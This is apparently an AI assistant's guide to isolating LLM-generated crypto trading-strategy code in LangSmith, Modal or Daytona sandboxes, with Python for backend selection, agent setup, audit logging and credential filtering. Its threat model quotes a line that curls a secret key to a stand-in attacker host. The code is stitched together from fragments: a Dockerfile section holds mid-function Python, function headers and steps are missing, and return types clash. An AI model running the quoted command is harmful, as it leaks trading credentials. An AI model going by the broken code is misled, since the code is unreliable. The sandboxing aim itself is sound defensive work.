## Three Things That Need Clarifying Before Integration

### 1. “One-line SDK spin-up” — Private Preview means waitlist first

LangSmith Sandbox is now in Private Preview. Sign up for the waitlist. You cannot `pip install langsmith` and start sandboxes today without waitlist approval. The integration below is written so you can run on Modal or Daytona **right now** (no waitlist) with a single backend swap when LangSmith Sandbox access arrives.

### 2. “Policy-based guardrails” — partially shipped, partially roadmap

What shipped March 17:

- MicroVM Isolation: each sandbox runs in a hardware-virtualized microVM, not just Linux namespaces. Kernel-level isolation between sandboxes.
- Auth Proxy: Sandboxes access external services through an Authentication Proxy, so secrets never touch the runtime. Credentials stay off the sandbox entirely.

What is **not yet shipped** (roadmap items):

- Binary authorization: Control which binaries can run inside a sandbox. — this is the “policy-based guardrail” you described. It is on the roadmap, not available today.
- Full execution tracing: Today, sandbox calls are traced alongside your agent’s runs. We’re working toward tracing everything that happens inside the virtual machine, including every process and network call.

### 3. “LangSmith Sandboxes” ≠ “Deep Agents sandbox backends”

These are two separate things in the official docs:

|                           |LangSmith Sandboxes                 |Deep Agents sandbox backends         |
|---------------------------|------------------------------------|-------------------------------------|
|**What**                   |Managed cloud sandbox infrastructure|OSS `BackendProtocol` implementations|
|**Status**                 |Private Preview (waitlist)          |GA, works today                      |
|**Providers**              |LangSmith-managed microVMs          |Modal, Daytona, Runloop              |
|**Auth Proxy**             |✅ Built-in                          |❌ Your responsibility                |
|**MicroVM isolation**      |✅ Hardware-level                    |Provider-dependent                   |
|**Deep Agents integration**|✅ Native via `backend=`             |✅ Same `backend=` param              |

For CryptoSwarms, **both matter**: use the OSS backends now, upgrade to LangSmith Sandboxes when preview access arrives. The `backend=` swap is one line.

## Why Sandboxes Are Critical for CryptoSwarms Specifically

Your existing `IsolationPolicy` dataclass in `agents/research/security_controls.py` already models the concept:

```python
@dataclass(frozen=True)
class IsolationPolicy:
    network_access: bool
    filesystem_scope: str
    allow_shell: bool
```

Without a sandbox, when `DeepAgentEvolver` edits `strategies/phase1_btc_breakout_15m.py` and runs `execute("python -m jesse backtest ...")`, it executes **on your host machine** with full access to your exchange API keys, database credentials, and all other running processes. That is unacceptable for a system that handles live trading capital.

Agents get a lot more useful when they can execute code. But letting an LLM run arbitrary code without isolation from your infrastructure is risky.

The exact threat model for CryptoSwarms:

- An LLM-generated strategy mutation could contain `import os; os.system("curl attacker.com -d $HYPERLIQUID_SECRET_KEY")`
- A hallucinated Jesse import could `pip install` a malicious package on your host
- A runaway backtest loop could consume all available RAM and crash the trading runtime
- A corrupted strategy file written directly to disk could reach the live execution pipeline

Sandboxes eliminate all four categories.

-----

## Architecture Decision: Sandbox as Tool (The Right Pattern)

The agent runs on your machine or server. When it needs to execute code, it calls sandbox tools which invoke the provider’s APIs to run operations in a remote sandbox. API keys stay outside the sandbox. Sandbox failures don’t lose agent state. Option to run tasks in multiple sandboxes in parallel.

This is the correct pattern for CryptoSwarms. Your `DeepAgentEvolver` orchestration logic, `ValidationPipeline` references, `MemoryDag`, and `ImmutableAuditLog` all stay on your host. Only the untrusted strategy code execution crosses into the sandbox boundary.

The alternative “agent in sandbox” pattern would require your Hyperliquid API keys to live inside the sandbox — this is a security risk and a hard no for a trading system.

## The CryptoSwarms Sandbox Docker Image

Bring your own Docker image. Use our defaults or point to your own private registry. Start every sandbox with exactly the filesystem and tooling you need.

Your existing `agents/Dockerfile` installs `.[memory]` but explicitly comments out `.[backtest,memory]`. The sandbox image is where backtest dependencies belong — isolated, not on your host.

**New file: `docker/cryptoswarms-sandbox/Dockerfile`**


```python
    thread_id: str,
    *,
    seed_files: list[tuple[str, bytes]] | None = None,
) -> Any:
    """
    Build the appropriate sandbox backend based on SANDBOX_PROVIDER env var.
    Returns a deepagents-compatible BackendProtocol instance.

    Args:
        thread_id: LangGraph thread ID; each thread gets its own isolated sandbox.
        seed_files: list of (absolute_path, content_bytes) to upload before agent runs.
                    Include the strategy file being evolved + any config files.
                    NEVER include .env files or credential files.
    """
    provider = os.getenv("SANDBOX_PROVIDER", "modal").lower()

    if provider == "langsmith":
        return _build_langsmith_sandbox(thread_id, seed_files)
    elif provider == "modal":
        return _build_modal_sandbox(thread_id, seed_files)
    elif provider == "daytona":
        return _build_daytona_sandbox(thread_id, seed_files)
    elif provider == "local":
        return _build_local_backend()
    else:
        raise ValueError(
            f"Unknown SANDBOX_PROVIDER={provider!r}. "
            "Valid values: langsmith, modal, daytona, local"
        )

    """Modal sandbox — available today. Best for GPU-accelerated backtesting."""
    import modal
    from langchain_modal import ModalSandbox

    app = modal.App.lookup(
        os.getenv("MODAL_APP_NAME", "cryptoswarms-evolution"),
        create_if_missing=True,
    )
    sandbox = modal.Sandbox.create(
        app=app,
        image=modal.Image.from_registry(SANDBOX_IMAGE),
        cpu=SANDBOX_CPU,
        memory=SANDBOX_MEMORY_GB * 1024,
        # Block outbound network by default — strategies should not make external calls
        # Remove this only if strategies need live data inside the sandbox
        # block_network=True,  # uncomment for stricter isolation
        timeout=3600,  # 1hr max; nightly evolution runs end here
        labels={"thread_id": thread_id, "component": "cryptoswarms-evolution"},
    )
    backend = ModalSandbox(sandbox=sandbox)
    if seed_files:
        backend.upload_files(seed_files)
    return backend, sandbox  # return sandbox for cleanup in finally block
```

## Updated `DeepAgentEvolver` with Sandbox Backend

**Edit `agents/evolution/deep_agent_evolver.py` — replace `_build_agent()` method:**

```python
def _build_agent(self, thread_id: str) -> tuple[object, object]:
    """
    Build deep agent with sandbox backend.
    Returns (agent, sandbox_handle) — caller must cleanup sandbox_handle in finally.
    """
    from agents.evolution.sandbox_backend_factory import build_sandbox_backend
    from deepagents import create_deep_agent
    from deepagents.backends import CompositeBackend, StoreBackend
    from langchain.chat_models import init_chat_model
    from langgraph.checkpoint.memory import MemorySaver
    from langgraph.store.memory import InMemoryStore

    # Seed sandbox with strategy file + program.md policy
    strategy_source = self.base_strategy_path.read_bytes()
    program_md = Path("agents/evolution/program.md").read_bytes()
    seed_files = [
        ("/sandbox/strategies/" + self.base_strategy_path.name, strategy_source),
        ("/sandbox/program.md", program_md),
        ("/sandbox/AGENTS.md", Path("AGENTS.md").read_bytes() if Path("AGENTS.md").exists() else b""),
    ]

    sandbox_backend, sandbox_handle = build_sandbox_backend(
        thread_id=thread_id,
        seed_files=seed_files,
    )

    # Cross-thread persistent memory goes to StoreBackend (on host, not in sandbox)
    # The sandbox only runs code — memories live outside it
    store = InMemoryStore()
    checkpointer = MemorySaver()

    def make_backend(rt):
        return CompositeBackend(
            default=sandbox_backend,         # all file ops and execute go to sandbox
            routes={
                "/memories/": StoreBackend(rt),  # memories stay on host, cross-thread
            },
        )

    agent = create_deep_agent(
        model=init_chat_model("claude-sonnet-4-6"),
        tools=[
            # These tools run on the HOST — exchange credentials never enter sandbox
            make_validation_tool(self.validation_pipeline, self.candidate_builder),
            make_chub_tool(),
            make_score_tool(self.score_fn),
            make_immutable_audit_tool(thread_id),  # see below
        ],
        subagents=[
            make_syntax_checker_subagent(),
            make_failure_analyzer_subagent(),
            make_backtest_runner_subagent(),   # see below — runs inside sandbox
        ],
        system_prompt=self._build_system_prompt(0.0),
        backend=make_backend,
        store=store,
        checkpointer=checkpointer,
        skills=["skills/"] if Path("skills").exists() else [],
        interrupt_on={
            "write_file": self.hitl_enabled,
            "edit_file": self.hitl_enabled,
            "execute": self.hitl_enabled,
        },
        name="cryptoswarms-evolver",
    )

    return agent, sandbox_handle
```

```python
            "metrics — Sharpe ratio, max drawdown, WFE, gate pass/fail. "
            "Never use for file editing or API calls."

Your ONLY job: run backtests and return clean metric summaries.

PROCEDURE:

2. Run: execute("cd /sandbox && python -m jesse backtest --full-reports 2>&1 | tail -30")
3. Parse the output for: Sharpe ratio, max drawdown, total return, trade count
4. Run: execute("cd /sandbox && python -c 'import vectorbt as vbt; ...'") for fast screening
```

```python
def make_immutable_audit_tool(thread_id: str) -> Callable:
    """Tool that downloads sandbox artifacts and writes them to ImmutableAuditLog on host."""
    from cryptoswarms.immutable_audit import ImmutableJsonlAuditLog
    from cryptoswarms.immutable_artifacts import write_immutable_json

    @tool
    def persist_experiment_artifacts(
        experiment_id: str,
        sharpe: float,
        kept: bool,
        change_description: str,
    ) -> str:
        """
        Download the evolved strategy file from sandbox and record in ImmutableAuditLog.
        Call this at the END of every experiment, whether kept or discarded.
        Args:
            experiment_id: unique ID for this experiment (e.g. "exp-001")
            sharpe: final Sharpe ratio achieved
            kept: whether this experiment was promoted
            change_description: one-line summary of what was changed in the strategy
        Returns "ok" or error string.
        """
        from pathlib import Path
        from datetime import datetime, timezone

        try:
            audit_log = ImmutableJsonlAuditLog(
                Path(f"data/evolution_audit/{thread_id}.jsonl")
            )
            audit_log.append(
                agent="deep_agent_evolver",
                action="experiment_complete",
                run_id=experiment_id,
                metadata={
                    "sharpe": sharpe,
                    "kept": kept,
                    "change": change_description,
                    "thread_id": thread_id,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                },
            )

            if kept:
                artifact_path = Path(
                    f"data/evolution_artifacts/{thread_id}/{experiment_id}/strategy.py"
                )
                # NOTE: In production, download from sandbox via backend.download_files()
                # before calling this tool. The agent should write the file first via
                # write_file, then call this tool.
                return "ok: artifact persisted to audit log"

            return "ok: discarded experiment recorded"

        except Exception as exc:
            return f"error: {exc}"

    return persist_experiment_artifacts
```

## The Nightly Cycle: Full Lifecycle with Cleanup

The sandbox must be cleaned up after every run. Resources cost money until terminated.

```python
# agents/evolution/deep_agent_evolver.py — run_async() full lifecycle

async def run_async(self, incumbent_score: float) -> AutoResearchReport:
    started_at = datetime.now(timezone.utc)
    thread_id = f"evolver-{started_at.strftime('%Y%m%d-%H%M%S')}"
    sandbox_handle = None

    try:
        agent, sandbox_handle = self._build_agent(thread_id)
        # ... experiment loop from previous document ...
        return report

    finally:
        # ALWAYS cleanup — whether success, failure, or exception
        if sandbox_handle is not None:
            provider = os.getenv("SANDBOX_PROVIDER", "modal").lower()
            try:
                if provider == "modal":
                    sandbox_handle.terminate()
                elif provider == "daytona":
                    sandbox_handle.stop()
                elif provider == "langsmith":
                    sandbox_handle.delete()
            except Exception:
                pass  # Log but don't raise — cleanup failure shouldn't mask the real error
```

## Security Model for CryptoSwarms Trading Systems

Never put secrets inside a sandbox. API keys, tokens, database credentials, and other secrets injected into a sandbox can be read and exfiltrated by a context-injected agent. This applies even to short-lived or scoped credentials.

For CryptoSwarms this is non-negotiable. Here is the complete credential boundary:

```
┌──────────────────────────────────────────────────────────────┐
│  HOST (your server)                                           │
│                                                               │
│  DeepAgentEvolver orchestration                               │
│  ValidationPipeline (gate logic)                              │
│  MemoryDag + ImmutableAuditLog                                │
│  SkillHubExecutionRouter (Hyperliquid, Binance, OKX)         │
│  exchange credentials ← NEVER cross this boundary            │
│  DB connection strings ← NEVER cross this boundary           │
│                                                               │
│  Host tools: make_validation_tool, make_score_tool           │
│    └─ These call ValidationPipeline on the HOST              │
│    └─ Exchange API keys used here, inside host process        │
│                                                               │
└──────────────┬───────────────────────────────────────────────┘
               │  Only crosses: strategy .py source code
               │  execute() calls → stdout/exit code back
               ▼
┌──────────────────────────────────────────────────────────────┐
│  SANDBOX (microVM isolated)                                   │
│                                                               │
│  /sandbox/strategies/*.py  ← LLM-generated code lives here   │
│  Jesse backtest runtime                                       │
│  vectorbt screening                                           │
│  syntax checking (ast.parse, py_compile)                      │
│  chub CLI (doc fetching only, no auth)                        │
│                                                               │
│  NO .env files                                                │
│  NO exchange credentials                                      │
│  NO database URLs                                             │
│  NO production network access (block_network=True when avail) │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

Your existing `filter_credentials()` in `agents/research/security_controls.py` should
be applied to **all text that crosses the sandbox boundary in either direction**:

```python
from agents.research.security_controls import filter_credentials

# Wrap every execute() result before returning to the agent
def safe_execute_output(raw_output: str) -> str:
    return filter_credentials(
        text=raw_output,
        secret_markers=("api_key", "secret", "token", "password", "HYPERLIQUID", "BINANCE"),
    )
```

## Summary

LangSmith Sandboxes is real, confirmed, and directly solves your most critical security
gap. Three things are true simultaneously:

1. **The LangSmith-managed cloud product** (Auth Proxy, MicroVM, Templates) is **waitlist only** — sign up at `langchain.com/langsmith-sandboxes-waitlist`
1. **You can build the full integration today** using Modal or Daytona as the sandbox backend via the same `backend=` parameter Deep Agents already supports — all code above works right now
1. **The switch to LangSmith Sandboxes when preview access arrives is one environment variable** — `SANDBOX_PROVIDER=langsmith` — because the `BackendProtocol` abstraction is already in place

The only features the user’s description overstated were binary authorization (policy-based guardrails) and full in-VM execution tracing — both confirmed on the roadmap but not shipped in yesterday’s release.
